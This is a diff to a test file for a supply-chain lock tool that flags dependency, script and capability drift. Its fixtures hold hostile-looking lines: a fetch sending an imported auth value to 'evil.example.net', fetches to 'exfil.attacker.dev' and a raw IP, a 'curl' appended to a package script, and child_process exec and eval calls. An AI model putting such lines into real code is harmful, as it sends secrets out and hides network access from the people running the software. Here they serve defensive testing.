@@ -549,14 +549,37 @@ test('lock: the same tree writes the same bytes, ordinary edits do not drift, st
   writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2; // an ordinary edit\n');
   assert.equal(drift(), '0');
   writeFileSync(join(d, 'src/db/q.js'), "import { a } from '../auth/a.js';\nexport const q = fetch('https://evil.example.net/x?e=' + a);\n");
-  assert.equal(drift(), '1', 'the new edge; example.net is reserved and not a host');
+  assert.equal(drift(), '2', 'the new edge and first network use; example.net is reserved and not a host');
   writeFileSync(join(d, 'src/db/q.js'), "export const q = fetch('https://exfil.attacker.dev/x');\n");
-  assert.equal(drift(), '1', 'the new host');
+  assert.equal(drift(), '2', 'the new host and first network use');
   writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2;\n');
   mkdirSync(join(d, 'src/app/reports'));
   writeFileSync(join(d, 'src/app/reports/route.ts'), 'export const GET = 1;\n');
   assert.equal(drift(), '0', 'a new route is reported, not held');
   assert.equal(execFileSync('node', [lockTool, 'drift', d, '--routes'], { encoding: 'utf8' }).trim(), '1', 'unless the repo asks');
+});
+
+test('lock: versions, script bodies, capabilities, binaries and IP hosts drift; a release of the project itself does not', () => {
+  const d = mkdtempSync(join(tmpdir(), 'pw-lock2-'));
+  execFileSync('git', ['init', '-q'], { cwd: d }); mkdirSync(join(d, 'src'));
+  const lock = (v = '1.0.0', dep = '1.3.0') => ({ name: 'a', version: v, lockfileVersion: 3, packages: { '': { name: 'a', version: v }, 'node_modules/left': { version: dep, resolved: `https://registry.npmjs.org/left/-/left-${dep}.tgz`, integrity: 'sha512-' + dep } } });
+  const pkg = { name: 'a', version: '1.0.0', scripts: { test: 'node t.js' } };
+  const put = (f, c) => writeFileSync(join(d, f), typeof c === 'string' ? c : JSON.stringify(c));
+  put('package.json', pkg); put('package-lock.json', lock()); put('src/a.js', 'export const a = 1;\n');
+  const tool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
+  execFileSync('node', [tool, 'write', d]);
+  const drift = () => execFileSync('node', [tool, 'drift', d], { encoding: 'utf8' }).trim();
+  const pins = () => execFileSync('node', [tool, 'drift', d, '--pins'], { encoding: 'utf8' }).trim();
+  put('package-lock.json', lock('1.0.1')); assert.equal(pins(), '0', 'our own release is not a dependency change');
+  put('package-lock.json', lock('1.0.0', '1.3.1')); assert.equal(pins(), '1', 'a new version under an old name'); assert.equal(drift(), '0', 'pins are their own guard');
+  put('package-lock.json', lock());
+  put('package.json', { ...pkg, scripts: { test: 'node t.js; curl x' } }); assert.equal(drift(), '1', 'a script body');
+  put('package.json', pkg);
+  put('src/a.js', "fetch('http://45.33.32.156/x');\n"); assert.equal(drift(), '2', 'the IP host and the first network use in the module');
+  put('src/a.js', "fetch('https://' + 'x' + '.dev/');\n"); assert.equal(drift(), '1', 'a host built at runtime still shows as a new capability');
+  put('src/a.js', "import { exec } from 'node:child_process';\nexport const a = 1;\n"); assert.equal(drift(), '1');
+  put('src/a.js', "eval(s);\n"); assert.equal(drift(), '1');
+  put('src/a.js', 'export const a = 1;\n'); put('src/x.node', 'ELF'); assert.equal(drift(), '1', 'a native addon');
 });
 
 test('lock: an agent cannot launder a change by updating the lock; a person can, with --allow; a trailer cannot', () => {
@@ -619,9 +642,9 @@ test('init --preset supply-chain: the held counts, the lock, the mandates, the c
   assert.equal((r.out.match(/installed packs\/supply-chain/g) || []).length, 1, 'one pack, announced once, however many metrics run it');
   assert.match(pw(d, ['init', '--list']).out, /supply-chain\s+gate: no new lifecycle scripts/);
   const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
-  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps', 'lock_drift']);
+  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps', 'lock_drift', 'pins_changed']);
   assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === 'flag' && m.cmd.startsWith('node .promptwheel/packs/supply-chain/')), JSON.stringify(cfg.metrics));
-  assert.deepEqual(cfg.mandates.map((m) => m.name), ['workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'lock-frozen', 'hooks-frozen']);
+  assert.deepEqual(cfg.mandates.map((m) => m.name), ['workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'scanner-frozen', 'lock-frozen', 'hooks-frozen']);
   assert.ok(cfg.mandates.every((m) => Array.isArray(m.paths) && m.paths.length && m.reason));
   assert.deepEqual(cfg.evaluatorPaths, ['promptwheel.config.json', 'sawbuck.config.json'], 'the contract is an evaluatorPath, not a mandate: a person can still retire a rule in a change that only edits it');
   for (const f of ['scan.mjs', 'pack.json', 'README.md']) assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain', f)), f + ' copied in');
